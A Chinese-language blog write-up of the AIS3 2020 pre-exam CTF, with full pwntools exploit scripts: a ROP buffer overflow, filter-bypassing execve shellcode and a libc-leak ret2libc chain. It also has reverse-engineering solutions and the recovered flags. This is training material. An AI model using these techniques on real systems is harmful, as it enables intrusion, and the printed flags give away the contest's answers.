<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>AIS3 2020 pre-exam writeups+心得 | r0yblog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="去年也參加過 AIS3 pre-exam 見去年心得，這似乎是變成每年這個時間的定番了呢(笑)，今年課程部份依舊是上課一星期，最後有 Group Project 發表的形式，而不同的是今年因為疫情的影響，原訂辦在交大「似乎」是改成了線上課程（不過聽說又改回實地參加了？）  scoreboard 備份">
<meta property="og:type" content="article">
<meta property="og:title" content="AIS3 2020 pre-exam writeups+心得">
<meta property="og:url" content="http://blog.roy4801.tw/2020/06/12/ais3/ais3_2020_pre_exam/index.html">
<meta property="og:site_name" content="r0yblog">
<meta property="og:description" content="去年也參加過 AIS3 pre-exam 見去年心得，這似乎是變成每年這個時間的定番了呢(笑)，今年課程部份依舊是上課一星期，最後有 Group Project 發表的形式，而不同的是今年因為疫情的影響，原訂辦在交大「似乎」是改成了線上課程（不過聽說又改回實地參加了？）  scoreboard 備份">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://i.imgur.com/TafxMoA.png">
<meta property="og:image" content="https://i.imgur.com/cbk8xjO.png">
<meta property="og:image" content="https://i.imgur.com/zMG6gUe.png">
<meta property="og:image" content="https://i.imgur.com/von5A3c.png">
<meta property="og:image" content="https://i.imgur.com/AlANLNL.png">
<meta property="og:image" content="https://i.imgur.com/G0GfruT.png">
<meta property="og:image" content="https://i.imgur.com/sxtKL5L.png">
<meta property="og:image" content="https://i.imgur.com/jssJ9z6.png">
<meta property="og:image" content="https://i.imgur.com/RbFHjZk.png">
<meta property="og:image" content="https://i.imgur.com/sDa5qRD.png">
<meta property="og:image" content="https://i.imgur.com/ld7uI7P.png">
<meta property="og:image" content="https://i.imgur.com/VLKXlvo.png">
<meta property="og:image" content="https://i.imgur.com/LM4TrQe.png">
<meta property="og:image" content="https://i.imgur.com/uZtX7ZT.png">
<meta property="og:image" content="https://i.imgur.com/jIs3Ymy.png">
<meta property="og:image" content="https://i.imgur.com/d3aUi1x.png">
<meta property="og:image" content="https://i.imgur.com/5eaRDT7.png">
<meta property="og:image" content="https://i.imgur.com/gx0iefC.png">
<meta property="og:image" content="https://i.imgur.com/SNOoMOL.png">
<meta property="og:image" content="https://i.imgur.com/O4Bzp2Y.png">
<meta property="og:image" content="https://i.imgur.com/rZYIs5V.png">
<meta property="og:image" content="https://i.imgur.com/aaT62hT.png">
<meta property="og:image" content="https://i.imgur.com/SYt0hOT.png">
<meta property="og:image" content="https://i.imgur.com/jC0QA58.png">
<meta property="og:image" content="https://i.imgur.com/m7Se733.png">
<meta property="og:image" content="https://i.imgur.com/tSgfRYP.png">
<meta property="og:image" content="https://i.imgur.com/iJyL0dT.png">
<meta property="og:image" content="https://i.imgur.com/8CU8eHF.png">
<meta property="og:image" content="https://i.imgur.com/4Dvw5Jo.png">
<meta property="og:image" content="https://i.imgur.com/DXoWu0Z.png">
<meta property="og:image" content="https://i.imgur.com/4nwkdLq.png">
<meta property="og:image" content="https://i.imgur.com/3CGKKPC.png">
<meta property="og:image" content="https://i.imgur.com/QiMqSaA.png">
<meta property="og:image" content="https://i.imgur.com/VERg9Sw.png">
<meta property="og:image" content="https://i.imgur.com/L41ty7G.png">
<meta property="og:image" content="https://i.imgur.com/40vZWP6.png">
<meta property="og:image" content="https://i.imgur.com/AJkOCWH.png">
<meta property="og:image" content="https://i.imgur.com/C3fhAqS.png">
<meta property="og:image" content="https://i.imgur.com/wpmIz2I.png">
<meta property="og:image" content="https://i.imgur.com/VLIi0Gg.png">
<meta property="og:image" content="https://i.imgur.com/qNPnsyz.png">
<meta property="og:image" content="https://i.imgur.com/RnBVuoB.png">
<meta property="og:image" content="https://i.imgur.com/hyBpVhq.png">
<meta property="og:image" content="https://i.imgur.com/Nl00idU.png">
<meta property="og:image" content="https://i.imgur.com/YZiFnNt.jpg">
<meta property="og:image" content="https://i.imgur.com/VemYvKF.png">
<meta property="article:published_time" content="2020-06-11T16:41:15.000Z">
<meta property="article:modified_time" content="2020-06-25T09:39:45.658Z">
<meta property="article:author" content="roy4801">
<meta property="article:tag" content="比賽">
<meta property="article:tag" content="心得">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/TafxMoA.png">
  
    <link rel="alternate" href="/atom.xml" title="r0yblog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    
  
  
<link rel="stylesheet" href="/css/style.css">

  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-133698344-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    
    <div id="header-inner" class="inner">
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.roy4801.tw"></form>
      </div>
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首頁</a>
        
          <a class="main-nav-link" href="/archives">歸檔</a>
        
          <a class="main-nav-link" href="/about">關於</a>
        
      </nav>
      
    </div>
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">r0yblog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">存放一些有關程式、生活、心得隨筆的網誌</a>
        </h2>
      
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-ais3/ais3_2020_pre_exam" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/12/ais3/ais3_2020_pre_exam/" class="article-date">
  <time datetime="2020-06-11T16:41:15.000Z" itemprop="datePublished">2020-06-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      AIS3 2020 pre-exam writeups+心得
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <p>去年也參加過 AIS3 pre-exam 見<a href="/2019/05/31/ais3/ais3_2019_pre_exam/">去年心得</a>，這似乎是變成每年這個時間的定番了呢(笑)，<br>今年課程部份依舊是上課一星期，最後有 Group Project 發表的形式，而不同的是今年因為疫情的影響，原訂辦在交大「似乎」是改成了線上課程（不過聽說又改回實地參加了？）</p>
<p><img src="https://i.imgur.com/TafxMoA.png" width="870"></p>
<p><a href="https://i.imgur.com/yTg1HJ0.jpg" target="_blank" rel="noopener">scoreboard 備份</a></p>
<h2 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h2><p>TODO</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h3><p>簡單的 bof ，要注意的是 <code>movaps</code> 的指令要求 stack 要對齊 0x10 byte，就找個 <code>ret</code> 的 gadget 掉過去就會 -8 byte</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>) <span class="comment"># i386, amd64</span></span><br><span class="line">_ATT = <span class="number">0</span></span><br><span class="line">_local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">"60.250.197.227"</span></span><br><span class="line">port = <span class="string">"10000"</span></span><br><span class="line">exe_path = <span class="string">'./bof'</span></span><br><span class="line"><span class="comment">#libc_path = './LIBC'</span></span><br><span class="line">r = <span class="literal">None</span></span><br><span class="line">elf = <span class="literal">None</span></span><br><span class="line">libc_elf = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> r, elf, libc_elf</span><br><span class="line">	elf = ELF(exe_path)</span><br><span class="line">	<span class="comment">#libc_elf = ELF(libc_path)</span></span><br><span class="line">	<span class="keyword">if</span> _local:</span><br><span class="line">		r = process(exe_path)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r = remote(host, port)</span><br><span class="line">conn()</span><br><span class="line"><span class="keyword">if</span> _ATT:</span><br><span class="line">	log.info(<span class="string">'Waiting for attach...'</span>)</span><br><span class="line">	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000400546 : ret</span></span><br><span class="line"><span class="comment"># 0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span></span><br><span class="line">ret = <span class="number">0x0400546</span></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>, <span class="string">'latin-1'</span>) *(<span class="number">64</span><span class="number">-8</span>) + p64(ret) + p64(pop_rdi) + p64(<span class="number">0x4007c8</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="nonsense"><a href="#nonsense" class="headerlink" title="nonsense"></a>nonsense</h3><p>程式可以輸入兩個字串，之後會檢查第二個字串，接著程式會 call 它（很明顯就是要塞 shellcode），但沒那麼簡單。</p>
<p><img src="https://i.imgur.com/cbk8xjO.png" alt=""></p>
<p><code>check()</code> 會檢查 <code>wubbalubbadubdub</code> 是否為 <code>yours</code> 的子字串（只檢查到第一個 match 的)<br>而且會先檢查該字元 <code>your[i]</code> 是否 <code>&lt;= 0x1f</code>，但只要出現了 <code>wubbalubbadubdub</code> 後頭就不會檢查<br>也就是說後頭可以塞正常的 shellcode</p>
<p><img src="https://i.imgur.com/zMG6gUe.png" alt=""></p>
<p>想法： 開頭塞個 ascii printable shellcode 跳轉到後頭的 shellcode，中間就塞 <code>wubbalubbadubdub</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   &#x2F;-------------------\</span><br><span class="line">  +                     v</span><br><span class="line">[跳轉][wubbalubbadubdub][shellcode]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>) <span class="comment"># i386, amd64</span></span><br><span class="line">_ATT = <span class="number">0</span></span><br><span class="line">_local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">"60.250.197.227"</span></span><br><span class="line">port = <span class="string">"10001"</span></span><br><span class="line">exe_path = <span class="string">'./nonsense'</span></span><br><span class="line"><span class="comment">#libc_path = './LIBC'</span></span><br><span class="line">r = <span class="literal">None</span></span><br><span class="line">elf = <span class="literal">None</span></span><br><span class="line">libc_elf = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> r, elf, libc_elf</span><br><span class="line">	elf = ELF(exe_path)</span><br><span class="line">	<span class="comment">#libc_elf = ELF(libc_path)</span></span><br><span class="line">	<span class="keyword">if</span> _local:</span><br><span class="line">		r = process(exe_path)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r = remote(host, port)</span><br><span class="line">conn()</span><br><span class="line"><span class="keyword">if</span> _ATT:</span><br><span class="line">	log.info(<span class="string">'Waiting for attach...'</span>)</span><br><span class="line">	raw_input()</span><br><span class="line"><span class="comment"># bytes('A', 'latin-1')</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">r.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'&#123;:c&#125;&#123;:c&#125;'</span>.format(<span class="number">0x77</span>, <span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">'wubbalubbadubdub'</span> * <span class="number">2</span></span><br><span class="line">payload = bytes(payload, <span class="string">'latin-1'</span>)</span><br><span class="line">payload += <span class="string">b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Portal-Gun"><a href="#Portal-Gun" class="headerlink" title="Portal Gun"></a>Portal Gun</h3><ul>
<li>本題有三個檔案<ul>
<li><code>portal_gun</code> 執行檔</li>
<li><code>libc.so.6</code> libc</li>
<li><code>hook.so</code><ul>
<li><code>system()</code> 被 hook 掉了</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>在 <code>portal_gun</code> 中送你一個 <code>system()</code></p>
<p><img src="https://i.imgur.com/von5A3c.png" alt=""></p>
<p>但是實際跳過去執行時，會發現 <code>system()</code> 被 hook 掉了</p>
<p><img src="https://i.imgur.com/AlANLNL.png" alt=""></p>
<p>但是有 <code>puts()</code> 可以利用，思路是：用 <code>puts()</code> leak 出某個 libc function 的 address (就 leak <code>puts()</code>)<br>接著可以算出真正 <code>system()</code> 的位置；或是直接跳 <code>one_gadget</code> 也可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>) <span class="comment"># i386, amd64</span></span><br><span class="line">_ATT = <span class="number">0</span></span><br><span class="line">_local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">"60.250.197.227"</span></span><br><span class="line">port = <span class="string">"10002"</span></span><br><span class="line"></span><br><span class="line">exe_path = <span class="string">'./portal_gun'</span></span><br><span class="line">ld_path = <span class="string">'./ld-2.27.so'</span></span><br><span class="line">libc_path = <span class="string">'./libc.so.6'</span></span><br><span class="line">r = <span class="literal">None</span></span><br><span class="line">elf = <span class="literal">None</span></span><br><span class="line">libc_elf = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> r, elf, libc_elf</span><br><span class="line">	elf = ELF(exe_path)</span><br><span class="line">	libc_elf = ELF(libc_path)</span><br><span class="line">	<span class="keyword">if</span> _local:</span><br><span class="line">		r = process([ld_path, exe_path], env=&#123;<span class="string">"LD_PRELOAD"</span>:libc_path&#125;)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r = remote(host, port)</span><br><span class="line">conn()</span><br><span class="line"><span class="keyword">if</span> _ATT:</span><br><span class="line">	log.info(<span class="string">'Waiting for attach...'</span>)</span><br><span class="line">	raw_input()</span><br><span class="line"><span class="comment"># bytes('A', 'latin-1')</span></span><br><span class="line"></span><br><span class="line">sh_str = <span class="number">0x04007C8</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">'gets'</span>]</span><br><span class="line">data_start = <span class="number">0x601800</span></span><br><span class="line"><span class="comment"># offset</span></span><br><span class="line">puts_off = libc_elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_off = libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gad</span></span><br><span class="line">pop_rdi = <span class="number">0x04007a3</span></span><br><span class="line">ret = <span class="number">0x0400291</span></span><br><span class="line">leave_ret = <span class="number">0x0040073b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">120</span><span class="number">-8</span>)</span><br><span class="line">payload = bytes(payload, <span class="string">'latin-1'</span>)</span><br><span class="line">payload += p64(data_start)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi) + p64(data_start)</span><br><span class="line">payload += p64(gets_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts = r.recvline()[:<span class="number">-1</span>]</span><br><span class="line">puts = puts.ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">puts_addr = u64(puts)</span><br><span class="line">info(<span class="string">'puts: &#123;&#125;'</span>.format(hex(puts_addr)))</span><br><span class="line">libc_base = puts_addr - puts_off</span><br><span class="line">info(<span class="string">'libc: &#123;&#125;'</span>.format(hex(libc_base)))</span><br><span class="line">system_addr = libc_base + system_off</span><br><span class="line">info(<span class="string">'system: &#123;&#125;'</span>.format(hex(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601a00</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) + p64(sh_str)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment"># one gadget</span></span><br><span class="line"><span class="comment"># payload += p64(libc_base+0x4f322)</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># AIS3&#123;U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o&#125;</span></span><br></pre></td></tr></table></figure>
<p>不過這題我遇到一點問題是：讓執行檔載入題目給訂的 libc，在本地即使成功運行 exploit，shell 也不會出來，但是在 remote 是能成功的<br>我猜是因為載入題目給訂的 libc 的關係，不過我還沒找到解法，如果有人能提供解法，我會很感謝的 :)</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h3><p>Flag 的每個字元會被 <code>TsaiBro</code> 轉成兩個 <code>......</code> 的字串，<code>.</code> 的數量是看字元 <code>in[i] == table[j]</code> 時，輸出 $j / 8 + 1$ 個點及 $j % 8 + 1$ 個點</p>
<p><img src="https://i.imgur.com/G0GfruT.png" alt=""><br><img src="https://i.imgur.com/sxtKL5L.png" alt=""></p>
<p>所以將密文的第一行去除後，每兩行為一組去推回原本的 flag，<a href="https://pastebin.com/JFYTk7Dz" target="_blank" rel="noopener">處理後的密文</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[] = &#123;<span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0x5F</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x30</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>&#125;;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">string</span> aa[<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(getline(<span class="built_in">cin</span>, s))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        cout &lt;&lt; s.size() &lt;&lt; '\n';</span></span><br><span class="line">        aa[i++] = s;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">            ans += <span class="number">8</span> * (aa[<span class="number">0</span>].size()<span class="number">-1</span>);</span><br><span class="line">            ans += aa[<span class="number">1</span>].size()<span class="number">-1</span>;</span><br><span class="line">            <span class="built_in">putchar</span>(table[ans]);</span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Fallen-Beat"><a href="#Fallen-Beat" class="headerlink" title="Fallen Beat"></a>Fallen Beat</h3><p>這題是 SDVX 欸www，怎麼 I’m so happy 不能玩QQ<br>這題是用 java 寫的音G，可以用 <code>jadx-gui</code> 反編譯 jar</p>
<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><ul>
<li><p>使用 java bytecode editor</p>
<ul>
<li>有人知道其他好用的工具拜託跟我講一下XD</li>
</ul>
</li>
<li><p>patch</p>
<ul>
<li><code>GameControl.run()</code> 中的 <code>this.pe.setValue</code></li>
<li>往 <code>setValue()</code> 裡頭追發現 flag 相關的邏輯在這</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; cache.size(); i2++) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = <span class="keyword">this</span>.flag;</span><br><span class="line">        <span class="keyword">int</span> length = i2 % <span class="keyword">this</span>.flag.length;</span><br><span class="line">        bArr[length] = (<span class="keyword">byte</span>) (cache.get(i2).intValue() ^ bArr[length]);</span><br><span class="line">    &#125;</span><br><span class="line">    String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">    <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">"Flag: %s"</span>, <span class="keyword">new</span> Object[]&#123;fff&#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>而 <code>t</code> 跟 <code>mc</code> 相對應到傳入的參數是 <code>this.total</code> 與 <code>this.comboMax</code><ul>
<li>所以上面的條件是：如果最高 combo 是 note 的總數的話，就會印出 flag</li>
<li>所以就 patch 掉這裡就好</li>
</ul>
</li>
</ul>
